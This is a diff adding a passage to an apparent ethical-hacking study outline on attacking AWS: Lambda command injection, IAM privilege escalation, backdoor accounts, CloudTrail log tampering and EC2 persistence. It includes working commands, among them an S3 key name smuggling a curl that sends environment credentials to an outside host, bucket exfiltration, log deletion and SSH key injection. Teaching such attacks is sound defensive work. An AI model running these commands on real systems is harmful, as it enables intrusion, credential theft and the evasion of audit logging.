@@ -17533,3 +17533,127 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 			- Next, list all accessible S3 buckets: aws s3 ls --profile stolen_profile
 				- This displays all S3 buckets that the compromised IAM role can access.
 			- Finally, synchronize and download the bucket contents to the local system: aws s3 sync s3://bucket-name /home/attacker/localstash/targetcloud/ --profile stolen_profile
+	- Attacks on AWS Lambda:
+		- Since serverless functions run without a managed server, they are vulnerable to various application-level attacks such as DDoS, command injection, and cross-site scripting (XSS). Attackers can exploit AWS Lambda functions to gain privileges and compromise the confidentiality of an account.
+		- Attackers can abuse Lambda functions through two primary scenarios, discussed below.
+		- Black-Box Scenario:
+			- In a black-box scenario, attackers make assumptions about a system’s features without prior knowledge of its internal workings or environment.
+			- Steps to perform an attack using the black-box scenario:
+				- Accessing a misconfigured S3 bucket: The attacker identifies an S3 bucket without proper credential enforcement. This bucket may contain sensitive organizational files.
+				- Uploading files to the S3 bucket: The attacker uploads files to S3 and verifies misconfigurations.
+				- Using AWS Lambda to analyze files: The attacker triggers a Lambda function that calculates file tags.
+				- Exfiltrating cloud credentials: The attacker extracts AWS cloud credentials from the environment and uses them to enumerate for higher privileges.
+			- AWS CLI Commands for the Attack:
+				- List objects within a specific S3 bucket: aws s3 ls prod-file-bucket-eu
+				- Retrieve object tags and useful metadata: aws s3api get-object-tagging --bucket prod-file-bucket-eu --key config161.zip
+				- Establish a connection with an EC2 instance and execute arbitrary commands: aws s3 cp config.zip 's3://prod-file-bucket-eu/screen;curl -X POST -d "testCurl" <Target IP>:443;'
+				- Extract AWS credentials using the environment variables: aws s3 cp config.zip 's3://prod-file-bucket-eu/screen;curl -X POST -d "`env`" <Target IP>:443;.zip'
+		- White-Box Scenario:
+			- In a white-box scenario, attackers already possess information about the target environment, making it easier to execute targeted attacks.
+			- Steps to perform an attack using the white-box scenario:
+				- Obtaining credentials: The attacker acquires user credentials through phishing or other social engineering techniques.
+				- Identifying misconfigured S3 buckets: The attacker gathers information on roles and policies associated with the compromised cloud account, focusing on misconfigured S3 buckets.
+				- Listing AWS Lambda functions: The attacker enumerates Lambda functions and obtains metadata about them.
+				- Downloading and analyzing Lambda code: With the acquired credentials, the attacker downloads the Lambda function’s code to analyze it for potential vulnerabilities.
+				- Exploiting the Lambda function: Using the identified vulnerabilities, the attacker launches further attacks against the cloud infrastructure.
+			- AWS CLI Commands for the Attack:
+				- List attached user policies for an account: aws iam list-attached-user-policies --user-name operator
+				- List Lambda functions and identify associated roles: aws lambda list-functions
+				- Retrieve Lambda function details, including download paths: aws lambda get-function --function-name corpFuncEasy
+	- AWS IAM Privilege Escalation Techniques (rhinosecuritylabs.com):
+		- After gaining access to a target cloud environment, attackers attempt to exploit their privileges to expand their attack surface and escalate their access for further exploitation.
+		- Below are several techniques attackers use to escalate AWS IAM privileges:
+		- Create a New Policy Version:
+			- Attackers with the iam:CreatePolicyVersion permission can create a new version of an existing IAM policy with elevated permissions. By using the --set-as-default flag while creating the policy, they can activate the new version without requiring iam:SetDefaultPolicyVersion permissions. This method allows attackers to gain high-level administrator access to the AWS account.
+		- Set an Existing Policy Version as Default:
+			- If attackers have the iam:SetDefaultPolicyVersion permission, they can escalate privileges by switching the active policy version to an existing non-default version that grants higher privileges. This enables them to elevate their access to the level specified in the unused policy version.
+		- Create an EC2 Instance with an Existing Instance Profile:
+			- Attackers with iam:PassRole and ec2:RunInstances permissions can launch a new EC2 instance using an existing instance profile. Once the instance is running, they can retrieve AWS credentials from the instance metadata and assume the permissions assigned to that profile, potentially gaining elevated access.
+		- Create a New User Access Key:
+			- Attackers with the iam:CreateAccessKey permission can generate new access key IDs and secret access keys for an IAM user. This allows them to assume all the permissions of that user.
+		- Create or Update a Login Profile:
+			- If attackers have iam:CreateLoginProfile permissions, they can create new AWS Management Console login credentials for an IAM user. Similarly, with iam:UpdateLoginProfile, they can modify existing login profiles. In both cases, attackers gain access to AWS resources using the target user's privileges.
+		- Attach a Policy to a User, Group, or Role:
+			- With the following permissions, attackers can escalate their privileges by attaching policies that grant additional permissions:
+				- iam:AttachUserPolicy – Attaches a policy to an IAM user.
+				- iam:AttachGroupPolicy – Attaches a policy to an IAM group.
+				- iam:AttachRolePolicy – Attaches a policy to an IAM role.
+			- By attaching a high-privilege policy to a compromised user, group, or role, attackers can elevate their permissions.
+		- Create or Update an Inline Policy for a User, Group, or Role:
+			- Attackers with the following permissions can create or modify inline policies, granting themselves elevated access:
+				- iam:PutUserPolicy – Adds or updates an inline policy for a user.
+				- iam:PutGroupPolicy – Adds or updates an inline policy for a group.
+				- iam:PutRolePolicy – Adds or updates an inline policy for a role.
+			- This technique allows attackers to assign themselves full administrative privileges.
+		- Add Themselves to an IAM Group:
+			- If attackers have the iam:AddUserToGroup permission, they can add themselves to an existing IAM group with higher privileges. This enables them to inherit all permissions associated with that group.
+	- Creating Backdoor Accounts in AWS:
+		- Attackers can establish backdoor accounts in an AWS cloud environment by creating rogue AWS accounts. They exploit existing resources by modifying policies or abusing APIs and AWS Resource Access Manager (RAM). Tools such as Endgame and Pacu enable attackers to create backdoor accounts within an AWS environment.
+		- Endgame (github.com):
+			- Endgame is an exploitation framework that allows attackers to gain control over an AWS cloud environment through a rogue account and establish backdoor access. Using its full suite of capabilities, attackers can generate a list of backdoor accounts within the targeted AWS cloud environment.
+			- This post-exploitation tool requires access to AWS API credentials from a user account with the necessary privileges to modify resource policies.
+			- Endgame can create backdoor accounts for various AWS resources, as shown in the screenshot below:
+			- List IAM resources associated with the user account: endgame list-resources -s iam
+			- List S3 buckets: endgame list-resources --service s3
+			- List resources across all AWS services: endgame list-resources --service all
+			- Create a backdoor for a specific resource: endgame expose --service iam --name test-resource-exposure
+	- Maintaining Access and Covering Tracks in an AWS Cloud Environment by Manipulating the CloudTrail Service:
+		- After gaining administrator-level access to cloud resources, attackers manipulate CloudTrail logs to remain undetected and maintain persistent access to the compromised environment. In AWS, user activities are monitored through the CloudTrail service. The first action an attacker takes after gaining high-level access is to hide their tracks.
+		- By default, the CloudTrail service is disabled. An administrator must explicitly enable CloudTrail and configure trails to monitor user activities. Attackers may disable logging by pausing the CloudTrail service and then resume it after executing their attack.
+		- To stop logging via CloudTrail, an attacker may run the following command: $ aws cloudtrail stop-logging --name targetcloud_trail --profile administrator
+		- To check the trail status, the following command can be used: $ aws cloudtrail get-trail-status --name targetcloud_trail --profile administrator
+		- After disabling CloudTrail, attackers can carry out various malicious activities, such as:
+			- Creating backdoor IAM users
+			- Exfiltrating sensitive data
+			- Running cryptocurrency mining scripts
+		- Once the attack is completed, logging can be re-enabled using: $ aws cloudtrail start-logging --name targetcloud_trail --profile administrator
+		- In some cases, attackers may attempt to permanently remove trails by executing: $ aws cloudtrail delete-trail --name targetcloud_trail --profile administrator
+		- Alternatively, they may delete the contents of the S3 bucket storing the logs with: $ aws s3 rb s3://<Bucket_Name or Bucket_Reference> --force --profile administrator
+		- Once the bucket contents are deleted, CloudTrail stops logging events. However, stopping or removing trails to erase tracks may trigger security alerts, as shown in the figure below.
+		- Other Techniques Attackers Use to Cover Their Tracks:
+			- Encrypting CloudTrail logs using a new encryption key
+			- Moving CloudTrail logs to a new S3 bucket
+			- Using AWS Lambda functions to delete newly recorded trail entries
+		- Maintaining Persistent Access:
+			- After clearing logs, attackers often establish persistent access to the cloud infrastructure. Common techniques include:
+				- Manipulating user data associated with EC2 instances that have privileged access
+				- Creating new EC2 instances based on an AMI and assigning them privileged roles
+				- Modifying an existing Lambda function to insert a backdoor (e.g., a function that creates a new user when invoked)
+				- Using Lambda functions to manipulate access keys, such as rabbit_lambda, cli_lambda, and backdoor_created_users_lambda
+		- By employing these tactics, attackers can maintain long-term access to the AWS environment while minimizing the risk of detection.
+	- Establishing Persistence on EC2 Instances:
+		- Establishing persistence in EC2 instances involves ensuring continuous access to a compromised system, even after a reboot or an attempt to remove the attacker’s foothold. This technique is crucial for attackers to maintain their presence and continue malicious activities.
+		- Techniques for Establishing Persistence on EC2 Instances:
+			- Creating Backdoor Users:
+				- Attackers can create new IAM users or roles with administrative privileges, ensuring they can regain access even if the original entry point is closed.
+				- Steps to Create Backdoor Users in an EC2 Instance:
+					- Step 1: Gain initial access to the EC2 instance with sufficient privileges.
+					- Step 2: Use the AWS CLI or Management Console to create a new IAM user or role with administrative permissions using the following commands:
+						aws iam create-user --user-name <Username>
+						aws iam attach-user-policy --user-name <Username> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+					- Step 3: Store the access keys securely for future logins.
+			- Altering Startup Scripts:
+				- By modifying instance startup scripts (e.g., rc.local, init.d, systemd), attackers can ensure that their malicious code runs every time an instance is restarted, maintaining their presence in the system.
+				- Steps to Alter Startup Scripts:
+					- Step 1: Gain root or sudo access to the EC2 instance.
+					- Step 2: Modify startup script files such as /etc/rc.local, /etc/init.d/, or systemd service files to include commands that execute malicious code.
+						echo "/path/to/malicious/script.sh" >> /etc/rc.local
+					- Step 3: Ensure the script has executable permissions.
+						chmod +x /path/to/malicious/script.sh
+			- SSH Key Injection:
+				- Adding their own SSH keys to the ~/.ssh/authorized_keys file allows attackers to log in using SSH without requiring passwords, providing stealthy and persistent access.
+				- Steps to Inject an Attacker’s SSH Key:
+					- Step 1: Access the target EC2 instance with sufficient privileges.
+					- Step 2: Add the attacker’s SSH public key to the ~/.ssh/authorized_keys file for the target user.
+						echo "ssh-rsa <attacker_public_key>" >> ~/.ssh/authorized_keys
+			- Installing Rootkits:
+				- Deploying rootkits enables attackers to hide their malicious processes and files from standard system-monitoring tools, ensuring they can maintain privileged access without detection.
+			- Leveraging IAM Roles:
+				- Attackers may abuse existing IAM roles or policies to create new roles with elevated permissions or modify existing roles, allowing persistent access to other AWS resources.
+				- Steps to Create New Malicious Roles in an AWS Environment:
+					- Step 1: Enumerate existing IAM roles with elevated privileges.
+					- Step 2: Use access to assume an existing role and create a new one with similar privileges.
+						- aws iam create-role --role-name <Role-name> --assume-role-policy-document file://Test-Role-Trust-Policy.json
+						- aws iam attach-role-policy --role-name <Role-name> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+					- Step 3: Use the new role to access other resources in the AWS environment.
+		- These techniques highlight the various methods attackers may use to maintain their presence in EC2 instances, complicating efforts to fully remove their access and secure the AWS environment.
